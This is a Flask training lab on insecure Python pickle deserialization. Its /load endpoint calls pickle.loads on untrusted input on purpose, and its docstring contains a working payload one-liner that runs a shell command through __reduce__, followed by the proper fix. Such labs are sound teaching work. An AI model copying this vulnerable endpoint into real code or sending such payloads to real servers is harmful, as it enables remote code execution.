"""
Lab 10 -- Insecure deserialization (pickle).

POST /load with a base64-encoded pickle blob in the body. The app
calls pickle.loads on it -- arbitrary Python code execution because
pickle is Turing-complete by design.

WARNING: do not run in any environment you care about. This
intentionally executes whatever Python code is in the payload.

Run:
    pip install flask
    python app.py

In Nullock:
    1. Send /load with body: pickle.dumps([1,2,3]) base64-encoded.
       Response: list info.
    2. Build a malicious payload:
         python -c "import pickle,base64,os; \
                    class E: \
                        def __reduce__(self): return (os.system, ('id > /tmp/owned',)); \
                    print(base64.b64encode(pickle.dumps(E())).decode())"
    3. Send that as the body of /load. The server runs `id > /tmp/owned`.
    4. Real fix: never deserialize untrusted pickle. Use JSON. If you
       MUST use pickle, sign it and verify HMAC before loads.
"""

import base64, pickle
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/load", methods=["POST"])
def load():
    raw = request.get_data()
    try:
        # VULN: untrusted pickle.
        obj = pickle.loads(base64.b64decode(raw))
        return jsonify(loaded=str(type(obj).__name__), value=str(obj)[:200])
    except Exception as e:
        return jsonify(error=str(e)), 400

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5010, debug=False)
